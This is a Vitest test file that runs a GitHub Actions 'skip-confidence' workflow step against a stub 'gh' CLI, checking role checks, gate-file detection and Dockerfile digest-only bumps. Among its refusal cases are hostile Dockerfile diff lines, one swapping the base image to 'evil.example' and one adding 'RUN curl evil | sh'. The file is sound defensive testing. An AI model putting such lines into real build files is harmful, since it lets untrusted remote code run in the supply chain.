import { spawnSync } from 'node:child_process';
import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { parse } from 'yaml';

// Runs the real "Grant skip on label" step under `bash -eo pipefail` against a stub `gh`, so the refusal rules are
// executed, not just read. The stub answers from the environment; it never reaches GitHub.
type Wf = { jobs: { skip: { steps: { name: string; run?: string }[] } } };
const wf = parse(readFileSync(join(import.meta.dirname, '..', '.github', 'workflows', 'skip-confidence.yml'), 'utf8')) as Wf;
const step = wf.jobs.skip.steps.find((s) => s.name === 'Grant skip on label')?.run ?? '';

// The stub answers like `gh api`: JSON bodies, and when the caller passes -q it applies that jq expression with raw output
// (gh's behaviour). A step that dropped or changed its -q would therefore see raw JSON here too and fail these tests.
const STUB = `#!/bin/bash
q=""; prev=""
for a in "$@"; do [ "$prev" = -q ] && q="$a"; prev="$a"; done
emit() { if [ -n "$q" ]; then printf '%s' "$1" | jq -r "$q"; else printf '%s\\n' "$1"; fi; }
case "$*" in
  *collaborators*) emit "{\\"role_name\\":\\"\${ROLE:-admin}\\"}" ;;
  *branches/main*) [ "\${NO_MAIN:-}" = 1 ] && exit 1; emit '{"commit":{"sha":"maintip"}}' ;;
  *compare/maintip...head*) [ "\${NO_COMPARE:-}" = 1 ] && exit 1; emit "$(cat "$FILES_JSON")" ;;
  *"contents/package.json?ref=maintip"*) echo "$PKG_BASE" ;;
  *"contents/package.json?ref=head"*) echo "$PKG_HEAD" ;;
  *statuses*) echo "STATUS $*" >> "$LOG" ;;
  *labels*) echo "LABEL_DELETED" >> "$LOG" ;;
esac
`;

let dir = '';
beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), 'skipconf-'));
  writeFileSync(join(dir, 'gh'), STUB);
  chmodSync(join(dir, 'gh'), 0o755);
});
afterAll(() => rmSync(dir, { recursive: true, force: true }));

type F = string | { filename: string; previous_filename: string };
const json = (files: F[]): string =>
  JSON.stringify({ files: files.map((f) => (typeof f === 'string' ? { filename: f } : f)) });
const many = (n: number): string[] => Array.from({ length: n }, (_, i) => `docs/page-${String(i).padStart(4, '0')}.md`);

function run(files: F[], env: Record<string, string> = {}): { posted: boolean; refused: string; labelDeleted: boolean } {
  writeFileSync(join(dir, 'files.json'), json(files));
  writeFileSync(join(dir, 'log'), '');
  writeFileSync(join(dir, 'summary'), '');
  const r = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', step], {
    encoding: 'utf8',
    env: {
      PATH: `${dir}:${process.env.PATH ?? ''}`,
      REPO: 'o/r', PR: '1', LABEL: 'skip-confidence', SENDER: 'me', SENDER_TYPE: 'User', HEAD_SHA: 'head',
      FILES_JSON: join(dir, 'files.json'), LOG: join(dir, 'log'), GITHUB_STEP_SUMMARY: join(dir, 'summary'),
      PKG_BASE: '{"scripts":{"test":"a"},"dependencies":{"x":"1"}}', PKG_HEAD: '{"scripts":{"test":"a"},"dependencies":{"x":"2"}}',
      ...env,
    },
  });
  expect(r.status, r.stderr).toBe(0); // a refusal is a green step, never a crash
  const log = readFileSync(join(dir, 'log'), 'utf8');
  return { posted: log.includes('STATUS'), refused: readFileSync(join(dir, 'summary'), 'utf8'), labelDeleted: log.includes('LABEL_DELETED') };
}

describe('skip-confidence step (stub gh)', () => {
  it('posts success for a dependency-only change by an admin', () => {
    const r = run(['package-lock.json']);
    expect(r.posted).toBe(true);
    expect(r.refused).not.toMatch(/refused/);
  });
  it('maintain is enough', () => {
    expect(run(['package-lock.json'], { ROLE: 'maintain' }).posted).toBe(true);
  });
  it.each(['write', 'triage', 'read', 'custom-role'])('role %s is refused and the label comes off', (ROLE) => {
    const r = run(['package-lock.json'], { ROLE });
    expect(r.posted).toBe(false);
    expect(r.labelDeleted).toBe(true);
    expect(r.refused).toMatch(/maintain or admin/);
  });
  it('an app sender is refused', () => {
    const r = run(['package-lock.json'], { SENDER_TYPE: 'Bot' });
    expect(r.posted).toBe(false);
    expect(r.refused).toMatch(/app, not a person/);
  });
  it.each(['.github/workflows/ci.yml', 'scripts/x.ts', 'extension/src/a.ts', 'tsconfig.json', 'vitest.config.ts', 'Dockerfile', 'charts/stralforsmcp/values.yaml'])(
    'a gate file (%s) is refused even next to harmless files',
    (f) => {
      const r = run(['package-lock.json', f]);
      expect(r.posted).toBe(false);
      expect(r.refused).toMatch(/gate or pipeline/);
    },
  );
  it('a changed scripts block in package.json is refused; a dependency bump is not', () => {
    expect(run(['package.json'], { PKG_HEAD: '{"scripts":{"test":"b"}}' }).posted).toBe(false);
    expect(run(['package.json']).posted).toBe(true);
  });
  it('an unreadable or empty base scripts block is refused (no null equals null)', () => {
    expect(run(['package.json'], { PKG_BASE: '{}', PKG_HEAD: '{}' }).posted).toBe(false);
    expect(run(['package.json'], { PKG_BASE: '', PKG_HEAD: '' }).posted).toBe(false);
  });
  // GitHub documents a total of 300 files for compare (all on page 1): a gate file can sit past the cut.
  it('300 files are refused, 299 are not', () => {
    const cut = run([...many(299), 'scripts/hidden.ts']);
    expect(cut.posted).toBe(false);
    expect(cut.refused).toMatch(/300 or more/);
    expect(run(many(299)).posted).toBe(true);
  });
  it.each([
    ['the compare call fails', { NO_COMPARE: '1' }],
    ['main cannot be resolved', { NO_MAIN: '1' }],
  ])('%s: refused, no status', (_n, env) => {
    const r = run(['package-lock.json'], env);
    expect(r.posted).toBe(false);
    expect(r.refused).toMatch(/unavailable/);
  });
  it('a rename counts as both paths: a gate path as the old name is refused', () => {
    const r = run([{ filename: 'docs/x.ts', previous_filename: 'scripts/x.ts' }]);
    expect(r.posted).toBe(false);
    expect(r.refused).toMatch(/gate or pipeline/);
    expect(run([{ filename: 'docs/b.md', previous_filename: 'docs/a.md' }]).posted).toBe(true);
  });
  describe('Dockerfile base image digest bump', () => {
    const d = (c: string): string => `sha256:${c.repeat(64)}`;
    const img = 'gcr.io/distroless/nodejs26-debian13:nonroot';
    const docker = (patch: string | undefined, status = 'modified'): F[] =>
      [{ filename: 'Dockerfile', status, ...(patch === undefined ? {} : { patch }) } as unknown as F];
    const hunk = (...lines: string[]): string => ['@@ -8,7 +8,7 @@ x', ' RUN npm ci', ...lines, ' ARG VERSION=0.0.0'].join('\n');

    it('a digest-only FROM change passes', () => {
      expect(run(docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`))).posted).toBe(true);
    });
    // The build stage line as it stands in the real Dockerfile.
    const deps = 'FROM --platform=$BUILDPLATFORM node:26-trixie-slim';
    it('the real build stage (--platform, AS deps) digest-only change passes, next to a harmless file', () => {
      const p = hunk(`-${deps}@${d('1')} AS deps`, `+${deps}@${d('2')} AS deps`);
      expect(run([...docker(p), 'package-lock.json']).posted).toBe(true);
    });
    it('both stages bumped in two hunks pass', () => {
      const p = [
        '@@ -1,4 +1,4 @@', ' # syntax', `-${deps}@${d('1')} AS deps`, `+${deps}@${d('2')} AS deps`, ' WORKDIR /app',
        '@@ -9,4 +9,4 @@', ' # Runtime', `-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`, ' ARG VERSION=0.0.0',
      ].join('\n');
      expect(run(docker(p)).posted).toBe(true);
    });
    it.each([
      ['a changed image name', hunk(`-FROM ${img}@${d('a')}`, `+FROM evil.example/node:nonroot@${d('b')}`)],
      ['a changed tag', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img.replace('nonroot', 'latest')}@${d('b')}`)],
      ['a changed stage name', hunk(`-FROM ${img}@${d('a')} AS run`, `+FROM ${img}@${d('b')} AS other`)],
      ['an extra non-FROM line', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`, '+RUN curl evil | sh')],
      ['a dropped digest', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}`)],
      ['an added FROM line only', hunk(`+FROM ${img}@${d('b')}`)],
      ['a short digest', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@sha256:abc`)],
      // Moving a FROM past an unchanged line moves that line into another stage.
      ['a FROM moved past an unchanged line', hunk(`-FROM ${img}@${d('a')}`, ' ARG X=1', `+FROM ${img}@${d('b')}`)],
      ['a FROM moved across hunks', ['@@ -1,2 +1,1 @@', `-FROM ${img}@${d('a')}`, ' ARG X=1', '@@ -9,1 +9,2 @@', ' ARG Y=1', `+FROM ${img}@${d('b')}`].join('\n')],
      ['a changed --platform', hunk(`-${deps}@${d('1')} AS deps`, `+FROM --platform=linux/amd64 node:26-trixie-slim@${d('2')} AS deps`)],
      ['a CR at the end of a FROM line', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}\r`)],
      ['a missing patch (too large)', undefined],
      ['an empty patch', ''],
    ])('%s is refused', (_n, patch) => {
      const r = run(docker(patch));
      expect(r.posted).toBe(false);
      expect(r.refused).toMatch(/gate or pipeline/);
    });
    it('a renamed Dockerfile is refused', () => {
      expect(run(docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`), 'renamed')).posted).toBe(false);
    });
    it('a digest-only Dockerfile next to a gate file is still refused', () => {
      const r = run([...docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`)), 'scripts/x.ts']);
      expect(r.posted).toBe(false);
      expect(r.refused).toMatch(/gate or pipeline/);
    });
  });
  it('an empty file list is refused', () => {
    expect(run([]).posted).toBe(false);
  });
});
